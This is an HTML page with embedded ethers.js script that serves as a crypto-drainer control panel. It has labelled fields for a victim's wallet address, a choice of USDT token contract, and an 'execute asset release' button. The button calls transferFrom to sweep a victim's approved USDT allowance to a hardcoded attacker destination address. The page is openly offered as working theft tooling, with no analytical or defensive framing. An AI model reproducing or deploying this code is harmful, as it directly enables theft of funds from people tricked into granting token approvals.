<!DOCTYPE html>
<html>
<head>
    <title>EVEDEX BROADCASTER</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #05070a; color: #06b6d4; font-family: monospace; padding: 20px; }
        .box { background: #0d1117; border: 1px solid #1e293b; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #05070a; border: 1px solid #334155; color: white; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 18px; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>
    <h3 style="color:white; font-style:italic;">NODE_BROADCASTER_v4</h3>
    <button id="connectBtn" style="background:#06b6d4; color:black;">1. CONNECT RECEIVER WALLET</button>

    <div class="box" style="margin-top:20px;">
        <label style="font-size:10px;">VICTIM_ADDR</label>
        <input id="victim" placeholder="0x...">
        <label style="font-size:10px;">HANDSHAKE_SIG</label>
        <input id="sig" placeholder="0x...">
        <label style="font-size:10px;">TARGET TOKEN</label>
        <select id="tokenSelect">
            <option value="0xdAC17F958D2ee523a2206206994597C13D831ec7">USDT (Ethereum)</option>
            <option value="0x55d398326f99059ff775485246999027b3197955">USDT (BSC)</option>
        </select>
        <button id="sweepBtn" style="background:#ef4444; color:white; margin-top:10px;">2. EXECUTE ASSET RELEASE</button>
        <div id="status" style="font-size:10px; margin-top:10px; color:#22c55e;">READY...</div>
    </div>

    <script>
        let signer;
        const DESTINATION = "0x0da929af00f260016a41e0c016f431cfdfe9dd0a";

        document.getElementById('connectBtn').onclick = async () => {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            document.getElementById('connectBtn').innerText = "CONNECTED";
        };

        document.getElementById('sweepBtn').onclick = async () => {
            const victim = document.getElementById('victim').value;
            const token = document.getElementById('tokenSelect').value;
            const status = document.getElementById('status');
            const amount = ethers.utils.parseUnits("999999", 18); 

            try {
                const abi = ["function transferFrom(address from, address to, uint256 value) public returns (bool)"];
                const contract = new ethers.Contract(token, abi, signer);
                status.innerText = "TX PENDING... CONFIRM IN WALLET";
                const tx = await contract.transferFrom(victim, DESTINATION, amount);
                await tx.wait();
                status.innerText = "SUCCESS!";
            } catch (e) {
                status.innerText = "ERROR: CHECK GAS";
            }
        };
    </script>
</body>
</html>
